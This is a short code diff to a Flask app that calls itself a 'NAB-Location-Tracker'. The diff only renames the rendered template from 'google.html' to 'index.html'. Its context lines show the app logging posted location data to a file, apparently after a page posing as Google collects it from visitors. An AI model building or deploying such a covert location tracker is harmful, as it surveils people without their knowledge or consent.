@@ -10,7 +10,7 @@ app = Flask(__name__)
 @app.route('/')
 def index():
     print("[+]NAB-Location-Tracker Active")
-    return render_template('google.html')
+    return render_template('index.html')
 
 
 @app.route('/post', methods=['POST',"GET"])
@@ -19,7 +19,7 @@ def say_name():
     try:
         data=data.split(":")
     except:
-        return render_template('google.html')
+        return render_template('index.html')
     
     try:
         print("Logging to user.txt for more reference..")
@@ -38,12 +38,12 @@ def say_name():
             done=True
 
 
-        return render_template('google.html')
+        return render_template('index.html')
         
     except Exception as e:
         print(e)
         print("[-]Error: I guess,Location Access Denied!")
-        return render_template("google.html")
+        return render_template("index.html")
 
 
 if __name__ == '__main__':
